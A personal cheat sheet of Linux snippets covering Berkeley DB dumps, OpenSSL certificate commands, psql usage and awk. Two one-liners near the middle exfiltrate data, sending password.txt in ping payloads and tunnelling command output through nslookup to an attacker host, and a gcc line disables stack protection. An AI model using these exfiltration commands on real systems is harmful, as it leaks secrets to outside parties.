# Useful Linux command line snippets

## View Berkeley DB files

```sh
$ file filename.db
postgrey.db: Berkeley DB (Btree, version 9, native byte-order)
$ db_dump -p filename.db
# <snip>
```

`db_dump` in package `core/db` on Arch/`db-util` on Debian

### in python

```python
import bsddb
for k, v in bsddb.btopen("filename.db").iteritems():
    print k, v
```

## OpenSSL one-liner to create a self-signed cert for 10 years

```sh cheat openssl Create self-signed cert
openssl req -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.crt
```

## gcc: enable executable stack, disable NX

```sh
gcc -fno-stack-protector -z execstack -o test test.c
```

## Postres psql commands

```
\? list all the commands.
\l(+) list databases.
\d(+) list tables, views, sequences.
\conninfo display information about current connection.
\c [DBNAME] connect to new database, e.g., \c template1.
\dt list tables.
\q quit psql.
```

This lists databases:

```
SELECT datname FROM pg_database
WHERE datistemplate = false;
```

This lists tables in the current database

```
SELECT table_schema,table_name
FROM information_schema.tables
ORDER BY table_schema,table_name;
```

## split lines and print them using awk

```
❯ cat testinput
user1          user2          user3
user4       user5     user6
user7
❯ cat testinput | awk '{printf "%s\n%s\n%s\n",$1,$2,$3}'
user1
user2
user3
user4
user5
user6
user7



# alternative solution
❯ awk '{print $1; print $2; print $3}' testinput
user1
user2
user3
user4
user5
user6
user7




```

There are newlines at the end that I can't explain, but I can live with that. I think they are because of the newline at the end of the file.

## Exfiltrate data via ping
`cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done`

## Exfiltrate data via nslookup (on Windows)
`for /F "tokens=1,2,3,4,5,6,7,8,9,10" %b in ('<cmd>') do nslookup "~!%b--%c--%d--%e--%f--%g--%h--%i--%j--%k~~" <attackerip>)`

## Generating .p12 from X509 and P7 using OpenSSL

### Generating PKCS12 Certificate using x509

 - Save Private Key in a file (cert-privkey.crt)
 - Save x509 Cert in a file (cert-pickup.crt)
 - Run Below command to generate PKCS12 Certificate (certificate.pfx)

```bash cheat openssl Convert x509 to PKCS12
openssl pkcs12 -export -out certificate.pfx -inkey cert-privkey.crt -in cert-pickup.crt
```

### Generating PKCS12 Certificate using PKCS7 Certificate

 - Save Private Key in a file (cert-privkey.crt)
 - Save x509 Cert in a file (cert-pickup.crt)
 - Run Below command to generate PKCS12 Certificate (certificate.pfx)

```bash cheat openssl convert PKCS7 to PKCS12
openssl pkcs7 -in cert-p7b-file.p7b -out smime-cert.pem -print_certs`
openssl pkcs12 -export -inkey cert-p7b-priv.key  -in smime-cert.pem -name Smime-SymantecTest -out smime-Final.pfx
```

## Extract data from PKCS12 certificate

```bash cheat openssl Extract CA, cert and key from PKCS12
openssl pkcs12 -in file.pfx -clcerts -nokeys -out cert.crt
openssl pkcs12 -in file.pfx -nocerts -nodes -out key.pem
openssl pkcs12 -in file.pfx -cacerts -nokeys -out ca.crt
```

tags: linux snippets python openssl postgresql awk
